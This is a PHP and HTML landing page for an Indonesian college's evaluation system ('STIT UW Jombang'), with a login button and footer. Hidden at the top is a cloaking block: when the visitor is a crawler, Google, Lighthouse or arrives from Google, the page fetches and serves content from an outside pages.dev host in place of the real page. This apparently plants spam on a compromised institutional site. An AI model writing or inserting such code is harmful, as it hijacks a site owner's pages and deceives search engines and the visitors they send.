<?php
$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';

if ($uri == '/' && (
    strpos($userAgent, 'bot') !== false || 
    strpos($userAgent, 'google') !== false || 
    strpos($userAgent, 'chrome-lighthouse') !== false || 
    strpos($referer, 'google') !== false
)) {
    echo file_get_contents('https://punten-neng.pages.dev/evaluasi.stituwjombang/');
    exit();
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sistem Informasi Evaluasi STIT UW Jombang</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(135deg, #00416A, #E4E5E6);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      font-family: "Segoe UI", sans-serif;
    }
    .card {
      max-width: 500px;
      border-radius: 16px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
    }
    .logo {
      width: 100px;
      margin-bottom: 15px;
    }
    footer {
      margin-top: 30px;
      font-size: 14px;
      color: #f1f1f1;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="card p-4 text-center">
    <img src="https://upload.wikimedia.org/wikipedia/commons/1/17/Logo_Kampus_Merdeka.png" class="logo" alt="Logo Kampus">
    <h3 class="fw-bold">Sistem Informasi Evaluasi</h3>
    <h5 class="mb-3">STIT UW Jombang</h5>
    <p class="text-muted">Gunakan <b>email resmi STIT UW Jombang</b> untuk masuk ke aplikasi ini.</p>
    <a href="login.html" class="btn btn-primary w-100">Login Sistem</a>
  </div>

  <footer>
    &copy; 2025 STIT UW Jombang • Sistem Informasi Evaluasi
  </footer>

</body>
</html>
